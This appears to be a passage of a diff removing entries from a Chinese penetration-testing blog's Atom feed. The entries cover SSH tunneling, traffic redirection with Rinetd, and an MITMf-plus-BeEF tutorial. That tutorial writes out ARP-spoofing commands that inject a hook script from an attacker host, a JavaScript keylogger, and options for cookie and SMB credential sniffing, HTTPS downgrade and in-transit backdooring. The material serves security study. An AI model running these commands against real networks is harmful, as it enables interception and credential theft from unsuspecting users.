-&lt;h3 id=&quot;SSH-隧道&quot;&gt;&lt;a href=&quot;#SSH-隧道&quot; class=&quot;headerlink&quot; title=&quot;SSH 隧道&quot;&gt;&lt;/a&gt;&lt;strong&gt;SSH 隧道&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;h4 id=&quot;SSH支持
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
-    
-    
-      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
-    
-      <category term="端口转发" scheme="http://c.cat.plus/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
-    
-      <category term="SSH" scheme="http://c.cat.plus/tags/SSH/"/>
-    
-      <category term="shell" scheme="http://c.cat.plus/tags/shell/"/>
-    
-      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>流量操控技术之重定向</title>
-    <link href="http://c.cat.plus/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-    <id>http://c.cat.plus/2015/07/01/Traffic_manipulation/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</id>
-    <published>2015-07-01T08:13:37.000Z</published>
-    <updated>2020-05-27T02:21:55.522Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="流量操控技术"><a href="#流量操控技术" class="headerlink" title="流量操控技术"></a><strong>流量操控技术</strong></h3></blockquote><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查措施和溯源追踪</li><li>证明看似严格的访问控制仍然存在弱点</li><li>在非受信任的网络中实现安全的数据传输</li><li>部分概念的实现过程略有烧脑</li></ul><h4 id="重定向-Redirection"><a href="#重定向-Redirection" class="headerlink" title="重定向 (Redirection)"></a><strong>重定向</strong> (Redirection)</h4><ul><li>IP,Port<h4 id="隧道-Tunnel"><a href="#隧道-Tunnel" class="headerlink" title="隧道 (Tunnel)"></a><strong>隧道</strong> (Tunnel)</h4></li><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点(IP2IP),端到端(Port2Port)隧道</li><li>VPN:pptp,l2tp,IPSec,SSL vpn</li></ul><h4 id="封装-Encapsulation"><a href="#封装-Encapsulation" class="headerlink" title="封装 (Encapsulation)"></a><strong>封装</strong> (Encapsulation)</h4><ul><li>通常结合在隧道中使用,使用一种协议封装一种协议(RPC o http,VoIP)</li><li>使用网关设备实现不同类型网络的互联互通</li></ul><h4 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a><strong>Rinetd</strong></h4><p>安装: <code>apt-get install rinetd</code><br>配置: <code>/etc/rinetd.conf</code><br>    <code>bindadd</code> <code>bindport</code> <code>connectadd</code> <code>connectport</code><br>运行: <code>rinetd</code></p><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a><strong>应用场景</strong></h5><ul><li>重定向web流量,突破上网限制</li><li>远程桌面重定向</li><li>nc重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h4><ul><li>安装monowall防火墙限制只某个端口能连接外网</li><li>一台模拟公司内网win机器,内网通过防火墙允许的端口访问Kali,由Kali重定向到外网</li><li>配置一台防火墙以外的Kali安装Rinetd作流量转发</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;流量操控技术&quot;&gt;&lt;a href=&quot;#流量操控技术&quot; class=&quot;headerlink&quot; title=&quot;流量操控技术&quot;&gt;&lt;/a&gt;&lt;strong&gt;流量操控技术&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;Traf
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
-    
-    
-      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
-    
-      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
-    
-      <category term="重定向" scheme="http://c.cat.plus/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-    
-      <category term="Rinetd" scheme="http://c.cat.plus/tags/Rinetd/"/>
-    
-      <category term="monowall" scheme="http://c.cat.plus/tags/monowall/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
-    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-    <id>http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
-    <published>2015-05-26T11:23:36.000Z</published>
-    <updated>2020-05-25T08:24:53.942Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;中间人攻击&quot;&gt;&lt;a href=&quot;#中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;中间人攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;h4 id=&quot;注入XSS&quot;&gt;&lt;a
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
-    
-      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
-    
-    
-      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
-    
-      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
-    
-      <category term="Mitmf" scheme="http://c.cat.plus/tags/Mitmf/"/>
-    
-      <category term="XSS" scheme="http://c.cat.plus/tags/XSS/"/>
-    
-      <category term="beef" scheme="http://c.cat.plus/tags/beef/"/>
     
   </entry>
   
